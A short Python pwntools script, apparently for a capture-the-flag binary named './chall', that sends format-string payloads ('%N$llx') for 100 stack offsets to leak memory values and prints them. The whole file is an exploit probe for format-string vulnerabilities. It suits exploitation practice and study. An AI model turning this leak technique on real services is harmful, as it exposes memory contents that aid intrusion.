from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

for i in range(100):
    try:
        sh = start()
        sh.sendlineafter("?", '%{}$llx'.format(i))
        # get the leaked values
        sh.recvuntil("?") 
        res = sh.recvline()
        fin = str(res)
        # print it
        print(fin)
    except EOFError:
        pass

sh.interactive()
